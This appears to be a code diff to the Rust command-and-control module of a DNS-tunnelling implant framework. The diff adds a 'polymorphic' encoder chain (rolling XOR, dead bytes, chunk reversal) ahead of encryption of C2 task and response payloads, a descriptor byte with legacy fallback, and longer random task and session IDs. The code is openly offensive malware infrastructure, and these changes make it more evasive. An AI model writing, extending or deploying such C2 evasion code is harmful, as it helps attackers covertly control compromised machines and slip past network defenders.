@@ -3,6 +3,7 @@ pub mod commands;
 use crate::crypto::{self, CryptoError, EncryptionKey};
 use crate::dns::{DnsBackend, DnsError};
 use base64::Engine;
+use log::warn;
 use serde::{Deserialize, Serialize};
 use thiserror::Error;
 
@@ -106,6 +107,14 @@ fn response_chunk_record(idx: usize, task_id: &str, session_id: &str, domain: &s
 
 // ─── Encrypted record helpers ───
 
+/// Encoder descriptor byte: first byte of encrypted blob indicates encoding.
+/// 0x00 = no polymorphic encoding (ChaCha20 only)
+/// 0x01 = light encoder chain (XOR rolling)
+/// 0x02 = medium encoder chain (XOR + dead bytes + chunk reverse)
+const ENC_NONE: u8 = 0x00;
+const ENC_LIGHT: u8 = 0x01;
+const ENC_MEDIUM: u8 = 0x02;
+
 fn encrypt_to_b64(key: &EncryptionKey, plaintext: &[u8]) -> Result<String, C2Error> {
     let encrypted = crypto::encrypt(key, plaintext)?;
     Ok(base64::engine::general_purpose::STANDARD.encode(&encrypted))
@@ -117,14 +126,99 @@ fn decrypt_from_b64(key: &EncryptionKey, b64: &str) -> Result<Vec<u8>, C2Error> 
     Ok(crypto::decrypt(key, &encrypted)?)
 }
 
-fn encrypt_json<T: Serialize>(key: &EncryptionKey, value: &T) -> Result<String, C2Error> {
+/// Encrypt JSON with optional polymorphic encoding layer.
+/// Format: [encoder_descriptor: 1 byte] [encode_keys_len: 2 bytes LE] [encode_keys_json] [encrypted_json]
+fn encrypt_json_encoded<T: Serialize>(key: &EncryptionKey, value: &T, encode: bool) -> Result<String, C2Error> {
     let json = serde_json::to_vec(value)?;
-    encrypt_to_b64(key, &json)
+
+    if !encode {
+        // Legacy path: no encoding, just encrypt
+        let mut payload = vec![ENC_NONE];
+        payload.extend_from_slice(&json);
+        return encrypt_to_b64(key, &payload);
+    }
+
+    // Apply polymorphic encoding before encryption
+    let chain = crate::encoder::EncoderChain::light();
+    let encoded = chain.encode(&json)
+        .map_err(|e| C2Error::Other(format!("encoder: {e}")))?;
+
+    // Serialize decode keys so the receiver can reverse the encoding
+    let keys_json = serde_json::to_vec(&encoded.decode_keys)
+        .map_err(|e| C2Error::Other(format!("encode keys serialize: {e}")))?;
+    let keys_len = keys_json.len() as u16;
+
+    let mut payload = Vec::with_capacity(3 + keys_json.len() + encoded.data.len());
+    payload.push(ENC_LIGHT);
+    payload.extend_from_slice(&keys_len.to_le_bytes());
+    payload.extend_from_slice(&keys_json);
+    payload.extend_from_slice(&encoded.data);
+
+    encrypt_to_b64(key, &payload)
+}
+
+/// Decrypt JSON, reversing any polymorphic encoding.
+fn decrypt_json_encoded<T: for<'de> Deserialize<'de>>(key: &EncryptionKey, b64: &str) -> Result<T, C2Error> {
+    let plaintext = decrypt_from_b64(key, b64)?;
+    if plaintext.is_empty() {
+        return Err(C2Error::Other("empty decrypted payload".into()));
+    }
+
+    let descriptor = plaintext[0];
+    let json_bytes = match descriptor {
+        ENC_NONE => {
+            // No encoding — rest is raw JSON
+            &plaintext[1..]
+        }
+        ENC_LIGHT | ENC_MEDIUM => {
+            // Polymorphic encoding — extract keys and decode
+            if plaintext.len() < 4 {
+                return Err(C2Error::Other("encoded payload too short".into()));
+            }
+            let keys_len = u16::from_le_bytes([plaintext[1], plaintext[2]]) as usize;
+            if 3 + keys_len > plaintext.len() {
+                return Err(C2Error::Other("keys length exceeds payload".into()));
+            }
+            let keys_json = &plaintext[3..3 + keys_len];
+            let encoded_data = &plaintext[3 + keys_len..];
+
+            let decode_keys: Vec<Vec<u8>> = serde_json::from_slice(keys_json)
+                .map_err(|e| C2Error::Other(format!("decode keys parse: {e}")))?;
+
+            let chain = match descriptor {
+                ENC_LIGHT => crate::encoder::EncoderChain::light(),
+                ENC_MEDIUM => crate::encoder::EncoderChain::medium(),
+                _ => unreachable!(),
+            };
+
+            let encoded_payload = crate::encoder::EncodedPayload {
+                data: encoded_data.to_vec(),
+                decode_keys,
+                num_passes: chain.passes.len() as u32,
+            };
+
+            let decoded = chain.decode(&encoded_payload)
+                .map_err(|e| C2Error::Other(format!("decoder: {e}")))?;
+
+            return Ok(serde_json::from_slice(&decoded)?);
+        }
+        other => {
+            // Unknown descriptor — try as legacy (no descriptor byte)
+            warn!("unknown encoder descriptor 0x{:02x}, trying legacy decode", other);
+            &plaintext[..]
+        }
+    };
+
+    Ok(serde_json::from_slice(json_bytes)?)
+}
+
+// Backward-compatible wrappers used by existing code paths
+fn encrypt_json<T: Serialize>(key: &EncryptionKey, value: &T) -> Result<String, C2Error> {
+    encrypt_json_encoded(key, value, false)
 }
 
 fn decrypt_json<T: for<'de> Deserialize<'de>>(key: &EncryptionKey, b64: &str) -> Result<T, C2Error> {
-    let plaintext = decrypt_from_b64(key, b64)?;
-    Ok(serde_json::from_slice(&plaintext)?)
+    decrypt_json_encoded(key, b64)
 }
 
 // ─── Agent-side operations ───
@@ -345,13 +439,13 @@ pub async fn wait_for_response(
 }
 
 pub fn generate_task_id() -> String {
-    let mut bytes = [0u8; 6];
+    let mut bytes = [0u8; 16]; // 128-bit — resistant to brute-force
     rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut bytes);
     hex::encode(bytes)
 }
 
 pub fn generate_session_id() -> String {
-    let mut bytes = [0u8; 6];
+    let mut bytes = [0u8; 16]; // 128-bit — resistant to brute-force
     rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut bytes);
     hex::encode(bytes)
 }
